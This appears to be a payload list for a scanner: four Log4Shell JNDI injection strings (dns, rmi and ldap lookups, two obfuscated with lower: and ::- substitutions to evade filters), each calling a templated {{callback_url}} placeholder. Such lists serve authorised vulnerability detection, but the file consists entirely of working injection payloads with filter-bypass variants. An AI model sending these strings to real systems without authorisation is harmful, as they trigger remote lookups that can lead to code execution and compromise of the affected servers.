${jndi:dns://{{callback_url}}/l4j}
${jndi:rmi://{{callback_url}}/log4shell}
${${lower:j}ndi:${lower:l}${lower:d}ap://{{callback_url}}/bypass}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{callback_url}}/x}
